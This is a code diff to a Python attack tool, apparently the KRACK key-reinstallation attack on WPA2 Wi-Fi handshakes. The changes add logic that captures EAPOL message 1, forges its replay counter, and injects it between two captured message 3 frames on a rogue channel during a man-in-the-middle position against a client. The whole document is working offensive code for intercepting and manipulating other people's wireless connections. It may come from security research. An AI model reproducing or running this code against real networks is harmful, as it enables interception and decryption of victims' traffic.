@@ -26,6 +26,7 @@ from wpaspy import Ctrl
 # - Option to attack specific client (search network its on, clone that one, and start attack)
 #
 # TODO:
+# - Mention to disable hardware encryption (similar to other attack test tools)
 # - Test against enterprise authentication. We will also have to forward EAP frames!
 # - Show "-- forwarding" when we haven't confirmed MitM on rouge channel, and "-- MitM'ing" when on rouge channel
 # - If EAPOL-Msg4 has been received on the real channel, the MitM attack has failed (maybe deauthenticate then)
@@ -202,6 +203,7 @@ def get_eapol_msgnum(p):
 			else: return 1
 		else:
 			# sent by server
+			# FIXME: use p[EAPOL.load] instead of str(p[EAPOL])
 			keydatalen = struct.unpack(">H", str(p[EAPOL])[97:99])[0]
 			if keydatalen == 0: return 4
 			else: return 2
@@ -209,7 +211,12 @@ def get_eapol_msgnum(p):
 	return 0
 
 def get_eapol_replaynum(p):
+	# FIXME: use p[EAPOL.load] instead of str(p[EAPOL])
 	return struct.unpack(">Q", str(p[EAPOL])[9:17])[0]
+
+def set_eapol_replaynum(p, value):
+	p[EAPOL].load = p[EAPOL].load[:5] + struct.pack(">Q", value) + p[EAPOL].load[13:]
+	return p
 
 def dot11_to_str(p):
 	EAP_CODE = {1: "Request"}
@@ -390,9 +397,13 @@ class ClientState():
 		self.attack_time = None
 
 		self.assocreq = None
+		self.msg1 = None
 		self.msg3s = []
 		self.msg4 = None
 		self.krack_finished = False
+
+	def store_msg1(self, msg1):
+		self.msg1 = msg1
 
 	def add_if_new_msg3(self, msg3):
 		if get_eapol_replaynum(msg3) in [get_eapol_replaynum(p) for p in self.msg3s]:
@@ -553,12 +564,22 @@ class KRAckAttack():
 		if args.group: return False
 
 		eapolnum = get_eapol_msgnum(p)
-		if eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
+		if eapolnum == 1 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
+			log(DEBUG, "Storing msg1")
+			client.store_msg1(p)
+		elif eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
 			client.add_if_new_msg3(p)
 			# FIXME: This may cause a timeout on the client side???
 			if len(client.msg3s) >= 2:
-				log(STATUS, "Got 2nd unique EAPOL msg3, will now forward both msg3's", color="green", showtime=False)
-				for p in client.msg3s: self.sock_rogue.send(p)
+				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both seperated by a forged msg1.", color="green", showtime=False)
+
+				# FIXME: Warning if msg1 was not detected. Or generate it ourselves.
+				packet_list = client.msg3s
+				p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
+				packet_list.insert(1, p)
+
+				# FIXME: How to make scapy send packets rapidly?
+				for p in packet_list: self.sock_rogue.send(p)
 				client.msg3s = []
 				# TODO: Should extra stuff be done here? Forward msg4 to real AP?
 				client.attack_start()
